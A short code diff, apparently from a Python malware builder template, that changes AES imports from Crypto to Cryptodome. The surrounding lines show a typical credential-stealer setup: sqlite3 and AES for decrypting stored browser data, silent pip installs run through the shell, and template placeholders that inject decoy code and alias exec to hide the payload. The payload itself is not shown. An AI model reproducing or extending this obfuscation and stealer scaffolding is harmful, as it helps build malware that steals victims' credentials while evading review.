@@ -201,7 +201,7 @@ import ctypes;import base64,subprocess,sqlite3,json,shutil
 import time
 ModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]
 try:
-    from Crypto.Cipher import AES
+    from Cryptodome.Cipher import AES
 except:
     subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)
     subprocess.Popen(executable + " -m pip install pycryptodome --quiet", shell=True)
@@ -214,7 +214,7 @@ for module in ModuleRequirements:
         except:
             subprocess.Popen(executable + " -m pip install pycryptodome --quiet", shell=True)
 
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 from json import loads, dumps
 from urllib.request import Request, urlopen
 try:
@@ -233,11 +233,11 @@ except:
     subprocess.run("python -m pip install requests", shell=True)
 
 try:
-    from Crypto.Cipher import AES
+    from Cryptodome.Cipher import AES
 except:
     subprocess.run("python -m pip install Crypto.Cipher", shell=True)
     
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 from cryptography.fernet import Fernet
 {all_fake_code}
 {e} = exec
